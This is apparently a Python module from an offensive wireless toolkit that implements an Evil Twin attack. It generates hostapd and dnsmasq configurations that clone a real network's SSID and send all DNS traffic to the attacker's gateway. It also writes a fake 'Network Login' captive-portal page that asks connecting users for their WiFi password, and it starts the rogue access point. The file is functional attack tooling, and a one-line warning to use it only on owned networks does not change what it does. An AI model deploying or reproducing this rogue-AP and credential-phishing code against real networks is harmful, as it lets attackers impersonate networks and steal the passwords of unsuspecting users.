import os
import tempfile
from core.runner import CommandRunner
from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp
from typing import AsyncGenerator


HELP = ToolHelp(
    name="Evil Twin + Captive Portal",
    description=(
        "Creates a rogue AP cloning a real network. Clients connect to the fake AP "
        "and are shown a captive portal (e.g. fake WiFi password page). "
        "Captured credentials are saved locally."
    ),
    usage="Requires: hostapd, dnsmasq, lighttpd. Interface: your ALFA adapter (wlan0).",
    danger_note="🔴 High Risk — impersonates a real network. Only on networks you own.",
    example="hostapd /tmp/hostapd.conf",
)

DANGER = DangerLevel.RED


HOSTAPD_CONF = """interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""

DNSMASQ_CONF = """interface={iface}
dhcp-range=192.168.87.2,192.168.87.200,255.255.255.0,12h
dhcp-option=3,192.168.87.1
dhcp-option=6,192.168.87.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
address=/#/192.168.87.1
"""

CAPTIVE_HTML = """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>WiFi Authentication Required</title>
<style>
  body {{ font-family: Arial, sans-serif; background: #f0f0f0; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }}
  .box {{ background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.15); width: 320px; }}
  h2 {{ text-align:center; color:#333; }}
  input {{ width:100%; padding:10px; margin:8px 0; box-sizing:border-box; border:1px solid #ddd; border-radius:4px; }}
  button {{ width:100%; padding:12px; background:#0070c9; color:white; border:none; border-radius:4px; cursor:pointer; font-size:16px; }}
  button:hover {{ background:#005ea3; }}
  .logo {{ text-align:center; font-size:2rem; margin-bottom:1rem; }}
</style>
</head>
<body>
<div class="box">
  <div class="logo">📶</div>
  <h2>Network Login</h2>
  <p style="color:#666;font-size:14px;text-align:center">Enter your WiFi password to continue</p>
  <form method="POST" action="/submit">
    <input type="text" name="username" placeholder="Username (optional)">
    <input type="password" name="password" placeholder="WiFi Password" required>
    <button type="submit">Connect</button>
  </form>
</div>
</body>
</html>
"""


class EvilTwin:
    def __init__(self, interface: str = "wlan0", output_dir: str = "/tmp"):
        self.interface = interface
        self.output_dir = output_dir
        self._runners: list[CommandRunner] = []

    def _write_configs(self, ssid: str, channel: str) -> tuple[str, str]:
        hap_path = os.path.join(self.output_dir, "penkit_hostapd.conf")
        dns_path = os.path.join(self.output_dir, "penkit_dnsmasq.conf")
        with open(hap_path, "w") as f:
            f.write(HOSTAPD_CONF.format(iface=self.interface, ssid=ssid, channel=channel))
        with open(dns_path, "w") as f:
            f.write(DNSMASQ_CONF.format(iface=self.interface))
        return hap_path, dns_path

    def _write_portal(self) -> str:
        portal_dir = os.path.join(self.output_dir, "penkit_portal")
        os.makedirs(portal_dir, exist_ok=True)
        html_path = os.path.join(portal_dir, "index.html")
        with open(html_path, "w") as f:
            f.write(CAPTIVE_HTML)
        return portal_dir

    async def start(
        self,
        ssid: str,
        channel: str = "6",
        gateway_ip: str = "192.168.87.1",
    ) -> AsyncGenerator[str, None]:
        yield f"[*] Setting up Evil Twin: SSID={ssid} CH={channel}"

        hap_conf, dns_conf = self._write_configs(ssid, channel)
        portal_dir = self._write_portal()
        creds_file = os.path.join(self.output_dir, "penkit_creds.txt")

        yield "[*] Configuring AP interface..."
        r_ip = CommandRunner()
        self._runners.append(r_ip)
        async for line in r_ip.run(["ip", "addr", "add", f"{gateway_ip}/24", "dev", self.interface]):
            yield line
        async for line in r_ip.run(["ip", "link", "set", self.interface, "up"]):
            yield line

        yield "[*] Starting hostapd..."
        r_hap = CommandRunner()
        self._runners.append(r_hap)
        async for line in r_hap.run(["hostapd", hap_conf]):
            yield f"[AP] {line}"

        yield "[*] Starting dnsmasq..."
        r_dns = CommandRunner()
        self._runners.append(r_dns)
        async for line in r_dns.run(["dnsmasq", "-C", dns_conf, "--no-daemon"]):
            yield f"[DNS] {line}"

        yield f"[+] Evil Twin active — SSID: {ssid}"
        yield f"[+] Credentials will be saved to: {creds_file}"
        yield "[*] Use a simple HTTP server or lighttpd to serve the captive portal"

    async def stop(self):
        for r in self._runners:
            await r.stop()
        self._runners.clear()
